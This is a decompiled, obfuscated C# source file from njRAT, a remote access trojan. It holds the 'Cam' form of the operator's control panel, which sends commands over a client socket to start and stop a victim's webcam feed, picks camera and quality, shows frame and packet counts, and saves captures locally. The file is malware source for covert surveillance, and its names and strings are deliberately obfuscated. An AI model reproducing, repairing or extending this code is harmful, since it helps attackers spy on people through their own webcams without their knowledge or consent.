using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x02000034 RID: 52
	[DesignerGenerated]
	public partial class Cam : Form
	{
		// Token: 0x0600013B RID: 315 RVA: 0x00010EFC File Offset: 0x0000F0FC
		public Cam()
		{
			base.FormClosing += this.\u0002;
			base.Load += this.\u0003;
			this.fps = 0;
			this.\u0008\u2000 = 0;
			this.QQ = string.Empty;
			this.folder = string.Empty;
			this.\u0002();
		}

		// Token: 0x0600013D RID: 317 RVA: 0x00010FA8 File Offset: 0x0000F1A8
		[DebuggerStepThrough]
		private void \u0002()
		{
			this.\u0002 = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Cam));
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(new Panel());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(new ComboBox());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(new CheckBox());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(new Button());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003(new ComboBox());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(new Timer(this.\u0002));
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(new PictureBox());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(new ProgressBar());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003(new Timer(this.\u0002));
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().SuspendLayout();
			((ISupportInitialize)this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()).BeginInit();
			this.SuspendLayout();
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003());
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Bottom;
			Control control = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			Point location = new Point(0, 170);
			control.Location = location;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138482);
			Control control2 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			Size size = new Size(346, 23);
			control2.Size = size;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().DropDownStyle = ComboBoxStyle.DropDownList;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().FlatStyle = FlatStyle.Flat;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().FormattingEnabled = true;
			Control control3 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			location = new Point(173, 0);
			control3.Location = location;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138495);
			Control control4 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			size = new Size(86, 22);
			control4.Size = size;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().TabIndex = 2;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().AutoSize = true;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Left;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control5 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			location = new Point(95, 0);
			control5.Location = location;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138479);
			Control control6 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			size = new Size(78, 23);
			control6.Size = size;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().TabIndex = 8;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138911);
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().UseVisualStyleBackColor = true;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Left;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().FlatStyle = FlatStyle.Flat;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control7 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control7.Location = location;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139756);
			Control control8 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			size = new Size(95, 23);
			control8.Size = size;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138894);
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().UseVisualStyleBackColor = true;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().BackColor = Color.Black;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().Dock = DockStyle.Right;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().DropDownStyle = ComboBoxStyle.DropDownList;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().FlatStyle = FlatStyle.Flat;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().ForeColor = Color.LightSteelBlue;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().FormattingEnabled = true;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().Items.AddRange(new object[]
			{
				\u0006\u2001.\u0002(-1829138938),
				\u0006\u2001.\u0002(-1829138917),
				\u0006\u2001.\u0002(-1829138927),
				\u0006\u2001.\u0002(-1829138841),
				\u0006\u2001.\u0002(-1829138819),
				\u0006\u2001.\u0002(-1829138829)
			});
			Control control9 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003();
			location = new Point(259, 0);
			control9.Location = location;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().Name = \u0006\u2001.\u0002(-1829138871);
			Control control10 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003();
			size = new Size(87, 22);
			control10.Size = size;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().TabIndex = 3;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Interval = 1000;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			Control control11 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control11.Location = location;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139547);
			Control control12 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			size = new Size(346, 160);
			control12.Size = size;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().SizeMode = PictureBoxSizeMode.Zoom;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().TabStop = false;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Bottom;
			Control control13 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 160);
			control13.Location = location;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138855);
			Control control14 = this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002();
			size = new Size(346, 10);
			control14.Size = size;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().TabIndex = 3;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().Enabled = true;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(346, 193);
			this.ClientSize = size;
			this.Controls.Add(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002());
			this.ForeColor = Color.SlateBlue;
			this.Icon = (Icon)componentResourceManager.GetObject(\u0006\u2001.\u0002(-1829139480));
			this.Name = \u0006\u2001.\u0002(-1829138778);
			this.Text = \u0006\u2001.\u0002(-1829138778);
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().ResumeLayout(false);
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().PerformLayout();
			((ISupportInitialize)this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()).EndInit();
			this.ResumeLayout(false);
		}

		// Token: 0x0600013E RID: 318 RVA: 0x00011640 File Offset: 0x0000F840
		internal virtual Panel 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003;
		}

		// Token: 0x0600013F RID: 319 RVA: 0x00011654 File Offset: 0x0000F854
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(Panel \u0002)
		{
			this.\u0003 = \u0002;
		}

		// Token: 0x06000140 RID: 320 RVA: 0x00011660 File Offset: 0x0000F860
		internal virtual ComboBox 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005;
		}

		// Token: 0x06000141 RID: 321 RVA: 0x00011674 File Offset: 0x0000F874
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(ComboBox \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E);
			if (this.\u0005 != null)
			{
				this.\u0005.SelectedIndexChanged -= value;
			}
			this.\u0005 = \u0002;
			if (this.\u0005 != null)
			{
				this.\u0005.SelectedIndexChanged += value;
			}
		}

		// Token: 0x06000142 RID: 322 RVA: 0x000116C4 File Offset: 0x0000F8C4
		internal virtual Button 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008;
		}

		// Token: 0x06000143 RID: 323 RVA: 0x000116D8 File Offset: 0x0000F8D8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(Button \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005);
			if (this.\u0008 != null)
			{
				this.\u0008.Click -= value;
			}
			this.\u0008 = \u0002;
			if (this.\u0008 != null)
			{
				this.\u0008.Click += value;
			}
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00011728 File Offset: 0x0000F928
		internal virtual Timer 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006;
		}

		// Token: 0x06000145 RID: 325 RVA: 0x0001173C File Offset: 0x0000F93C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002);
			if (this.\u0006 != null)
			{
				this.\u0006.Tick -= value;
			}
			this.\u0006 = \u0002;
			if (this.\u0006 != null)
			{
				this.\u0006.Tick += value;
			}
		}

		// Token: 0x06000146 RID: 326 RVA: 0x0001178C File Offset: 0x0000F98C
		internal virtual PictureBox 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000E;
		}

		// Token: 0x06000147 RID: 327 RVA: 0x000117A0 File Offset: 0x0000F9A0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(PictureBox \u0002)
		{
			PaintEventHandler value = new PaintEventHandler(this.\u0002);
			if (this.\u000E != null)
			{
				this.\u000E.Paint -= value;
			}
			this.\u000E = \u0002;
			if (this.\u000E != null)
			{
				this.\u000E.Paint += value;
			}
		}

		// Token: 0x06000148 RID: 328 RVA: 0x000117F0 File Offset: 0x0000F9F0
		internal virtual ComboBox 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000F;
		}

		// Token: 0x06000149 RID: 329 RVA: 0x00011804 File Offset: 0x0000FA04
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003(ComboBox \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006);
			if (this.\u000F != null)
			{
				this.\u000F.SelectedIndexChanged -= value;
			}
			this.\u000F = \u0002;
			if (this.\u000F != null)
			{
				this.\u000F.SelectedIndexChanged += value;
			}
		}

		// Token: 0x0600014A RID: 330 RVA: 0x00011854 File Offset: 0x0000FA54
		internal virtual CheckBox 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0002\u2000;
		}

		// Token: 0x0600014B RID: 331 RVA: 0x00011868 File Offset: 0x0000FA68
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(CheckBox \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008);
			if (this.\u0002\u2000 != null)
			{
				this.\u0002\u2000.CheckedChanged -= value;
			}
			this.\u0002\u2000 = \u0002;
			if (this.\u0002\u2000 != null)
			{
				this.\u0002\u2000.CheckedChanged += value;
			}
		}

		// Token: 0x0600014C RID: 332 RVA: 0x000118B8 File Offset: 0x0000FAB8
		internal virtual ProgressBar 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003\u2000;
		}

		// Token: 0x0600014D RID: 333 RVA: 0x000118CC File Offset: 0x0000FACC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002(ProgressBar \u0002)
		{
			this.\u0003\u2000 = \u0002;
		}

		// Token: 0x0600014E RID: 334 RVA: 0x000118D8 File Offset: 0x0000FAD8
		internal virtual Timer 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0005\u2000;
		}

		// Token: 0x0600014F RID: 335 RVA: 0x000118EC File Offset: 0x0000FAEC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F);
			if (this.\u0005\u2000 != null)
			{
				this.\u0005\u2000.Tick -= value;
			}
			this.\u0005\u2000 = \u0002;
			if (this.\u0005\u2000 != null)
			{
				this.\u0005\u2000.Tick += value;
			}
		}

		// Token: 0x06000150 RID: 336 RVA: 0x0001193C File Offset: 0x0000FB3C
		private void \u0002(object \u0002, EventArgs \u0003)
		{
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Enabled = false;
			try
			{
				if (this.osk == null | this.sk == null)
				{
					this.Close();
					return;
				}
				if (!this.osk.CN | !this.sk.CN)
				{
					this.Close();
				}
			}
			catch (Exception ex)
			{
			}
			this.\u0008\u2000 = this.fps;
			if (this.\u0008\u2000 == 0)
			{
				this.pkt = 0;
				this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Invalidate();
			}
			this.fps = 0;
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Enabled = true;
		}

		// Token: 0x06000151 RID: 337 RVA: 0x00011A04 File Offset: 0x0000FC04
		private void \u0002(object \u0002, PaintEventArgs \u0003)
		{
			try
			{
				string text = Conversions.ToString(this.\u0008\u2000) + \u0006\u2001.\u0002(-1829138756) + global::\u000E.\u0002((long)this.pkt);
				Size size = TextRenderer.MeasureText(text, new Font(this.Font, FontStyle.Bold));
				Graphics graphics = \u0003.Graphics;
				Brush black = Brushes.Black;
				Rectangle rect = new Rectangle(0, 0, size.Width, size.Height);
				graphics.FillRectangle(black, rect);
				Brush brush = Brushes.Red;
				if (this.\u0008\u2000 > 3)
				{
					brush = Brushes.YellowGreen;
				}
				if (this.\u0008\u2000 > 6)
				{
					brush = Brushes.LimeGreen;
				}
				\u0003.Graphics.DrawString(text, new Font(this.Font, FontStyle.Bold), brush, 0f, 0f);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000152 RID: 338 RVA: 0x00011AE8 File Offset: 0x0000FCE8
		private void \u0002(object \u0002, FormClosingEventArgs \u0003)
		{
			try
			{
				if (this.sk.CN)
				{
					this.sk.Send(\u0006\u2001.\u0002(-1829138768));
				}
				this.sk.CN = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000153 RID: 339 RVA: 0x00011B50 File Offset: 0x0000FD50
		private void \u0003(object \u0002, EventArgs \u0003)
		{
			try
			{
				this.QQ = Conversions.ToString(\u000E\u2000.\u0002(this.osk.L));
				this.Text = this.QQ;
				this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().SelectedIndex = 3;
				this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Enabled = true;
				this.folder = this.osk.Folder + \u0006\u2001.\u0002(-1829138808);
				if (!Directory.Exists(this.folder))
				{
					Directory.CreateDirectory(this.folder);
				}
				try
				{
					this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().SelectedIndex = \u000E\u2000.\u0002.\u0005\u2000;
				}
				catch (Exception ex)
				{
					this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().SelectedIndex = 3;
				}
				if (\u000E\u2000.\u0002.\u0003\u2000)
				{
					this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138787);
					this.sk.Send(string.Concat(new string[]
					{
						\u0006\u2001.\u0002(-1829138798),
						\u000E\u2000.\u000E,
						Conversions.ToString(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().SelectedIndex),
						\u000E\u2000.\u000E,
						this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().Text
					}));
				}
			}
			catch (Exception ex2)
			{
				this.Close();
			}
		}

		// Token: 0x06000154 RID: 340 RVA: 0x00011CDC File Offset: 0x0000FEDC
		private void \u0005(object \u0002, EventArgs \u0003)
		{
			try
			{
				if (Operators.CompareString(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) == 0)
				{
					this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138787);
					this.sk.Send(string.Concat(new string[]
					{
						\u0006\u2001.\u0002(-1829138798),
						\u000E\u2000.\u000E,
						Conversions.ToString(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().SelectedIndex),
						\u000E\u2000.\u000E,
						this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().Text
					}));
				}
				else
				{
					this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138894);
					this.sk.Send(\u0006\u2001.\u0002(-1829138768));
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000155 RID: 341 RVA: 0x00011DCC File Offset: 0x0000FFCC
		private void \u0008(object \u0002, EventArgs \u0003)
		{
			if (this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Checked)
			{
				try
				{
					Process.Start(this.folder);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000156 RID: 342 RVA: 0x00011E1C File Offset: 0x0001001C
		private void \u0006(object \u0002, EventArgs \u0003)
		{
			if (Operators.CompareString(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138787), false) == 0)
			{
				NewLateBinding.LateCall(this.sk, null, \u0006\u2001.\u0002(-1829138710), new object[]
				{
					Operators.ConcatenateObject(\u0006\u2001.\u0002(-1829138798) + \u000E\u2000.\u000E + Conversions.ToString(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().SelectedIndex) + \u000E\u2000.\u000E, this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().SelectedItem)
				}, null, null, null, true);
			}
		}

		// Token: 0x06000157 RID: 343 RVA: 0x00011EB4 File Offset: 0x000100B4
		private void \u000E(object \u0002, EventArgs \u0003)
		{
			if (Operators.CompareString(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138787), false) == 0)
			{
				NewLateBinding.LateCall(this.sk, null, \u0006\u2001.\u0002(-1829138710), new object[]
				{
					Operators.ConcatenateObject(\u0006\u2001.\u0002(-1829138798) + \u000E\u2000.\u000E + Conversions.ToString(this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().SelectedIndex) + \u000E\u2000.\u000E, this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0003().SelectedItem)
				}, null, null, null, true);
			}
		}

		// Token: 0x06000158 RID: 344 RVA: 0x00011F4C File Offset: 0x0001014C
		private void \u000F(object \u0002, EventArgs \u0003)
		{
			this.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Value = this.sk.rp();
		}

		// Token: 0x040000EE RID: 238
		[AccessedThroughProperty("Panel1")]
		private Panel \u0003;

		// Token: 0x040000EF RID: 239
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox \u0005;

		// Token: 0x040000F0 RID: 240
		[AccessedThroughProperty("Button1")]
		private Button \u0008;

		// Token: 0x040000F1 RID: 241
		[AccessedThroughProperty("Timer1")]
		private Timer \u0006;

		// Token: 0x040000F2 RID: 242
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox \u000E;

		// Token: 0x040000F3 RID: 243
		[AccessedThroughProperty("ComboBox2")]
		private ComboBox \u000F;

		// Token: 0x040000F4 RID: 244
		[AccessedThroughProperty("CheckBox3")]
		private CheckBox \u0002\u2000;

		// Token: 0x040000F5 RID: 245
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar \u0003\u2000;

		// Token: 0x040000F6 RID: 246
		[AccessedThroughProperty("Timer2")]
		private Timer \u0005\u2000;

		// Token: 0x040000F7 RID: 247
		public Client sk;

		// Token: 0x040000F8 RID: 248
		public Client osk;

		// Token: 0x040000F9 RID: 249
		public int fps;

		// Token: 0x040000FA RID: 250
		private int \u0008\u2000;

		// Token: 0x040000FB RID: 251
		public int pkt;

		// Token: 0x040000FC RID: 252
		public string QQ;

		// Token: 0x040000FD RID: 253
		public string folder;
	}
}
